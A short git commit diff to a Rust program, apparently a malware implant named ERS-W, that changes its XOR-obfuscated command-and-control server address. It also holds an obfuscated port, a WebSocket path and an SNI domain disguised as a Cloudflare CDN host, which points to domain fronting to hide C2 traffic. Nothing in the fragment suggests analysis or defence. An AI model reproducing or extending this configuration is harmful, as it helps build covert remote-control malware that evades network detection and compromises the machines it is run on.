3b771f226692f267dcfbe00fefc197788166d3c7
Team X <we@OS>
2026-07-31 14:48:26 +0500

    Commit

--- ERS-W/src/main.rs
+++ ERS-W/src/main.rs
@@ -25,7 +25,7 @@ fn xd(encoded: &[u8]) -> String {
 }
 
 // C2
-const ENC_C2_HOST: [u8; 15] = xor_encode(b"10.37.233.204  ");
+const ENC_C2_HOST: [u8; 15] = xor_encode(b"10.120.148.163 ");
 const ENC_C2_PORT: [u8; 4] = xor_encode(b"4443");
 const ENC_SNI_DOMAIN: [u8; 22] = xor_encode(b"cdn-wss.cloudflare.com");
 const ENC_WSS_PATH: [u8; 4] = xor_encode(b"/ws ");
